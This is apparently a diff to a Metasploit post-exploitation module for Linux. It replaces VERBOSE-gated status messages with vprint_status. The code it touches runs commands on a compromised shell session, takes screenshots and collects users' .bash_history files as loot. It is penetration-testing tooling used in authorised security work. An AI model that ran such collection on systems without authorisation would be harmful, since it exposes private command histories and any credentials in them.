@@ -41,12 +41,6 @@ class Metasploit3 < Msf::Post
 				'Platform'      => [ 'linux' ],
 				'SessionTypes'  => [ "shell" ]
 			))
-
-			register_options(
-			[
-				OptBool.new('VERBOSE', [false, 'Show detailed status messages', false]),
-			], self.class)
-
 	end
 
 	# Run Method for when run command is issued
@@ -103,7 +97,7 @@ class Metasploit3 < Msf::Post
 	# Save enumerated data
 	def save(msg, data, ctype="text/plain")
 		ltype = (ctype == 'image/x-xwd') ? "host.linux.screenshot" : "linux.enum"
-		print_status(msg) if datastore['VERBOSE']
+		vprint_status(msg)
 		loot = store_loot(ltype, ctype, session, data, nil, msg)
 		print_status("#{msg} stored in #{loot.to_s}")
 	end
@@ -123,19 +117,19 @@ class Metasploit3 < Msf::Post
 	end
 
 	def execute(cmd)
-		print_status("Execute: #{cmd}") if datastore['VERBOSE']
+		vprint_status("Execute: #{cmd}")
 		output = cmd_exec(cmd)
 		return output
 	end
 
 	def cat_file(filename)
-		print_status("Download: #{filename}") if datastore['VERBOSE']
+		vprint_status("Download: #{filename}")
 		output = read_file(filename)
 		return output
 	end
 
 	def get_screenshot
-		print_status("Capturing screenshot") if datastore['VERBOSE']
+		vprint_status("Capturing screenshot")
 		xwd_filename = "/tmp/" + Rex::Text.rand_text_alpha(5) + ".xwd"
 
 		#Take a snapshot and save it.
@@ -184,19 +178,19 @@ class Metasploit3 < Msf::Post
 		if user == "root"
 			users.each do |u|
 				if u == "root"
-					print_status("Extracting history for #{u}") if datastore['VERBOSE']
+					vprint_status("Extracting history for #{u}")
 					hist = cat_file("/root/.bash_history")
 				else
-					print_status("Extracting history for #{u}") if datastore['VERBOSE']
+					vprint_status("Extracting history for #{u}")
 					hist = cat_file("/home/#{u}/.bash_history")
 				end
 
 				save("History for #{u}", hist) unless hist =~ /No such file or directory/
 			end
 		else
-			print_status("Extracting history for #{user}") if datastore['VERBOSE']
+			vprint_status("Extracting history for #{user}")
 			hist = cat_file("/home/#{user}/.bash_history")
-			print_status(hist) if datastore['VERBOSE']
+			vprint_status(hist)
 			save("History for #{user}", hist) unless hist =~ /No such file or directory/
 		end
 	end
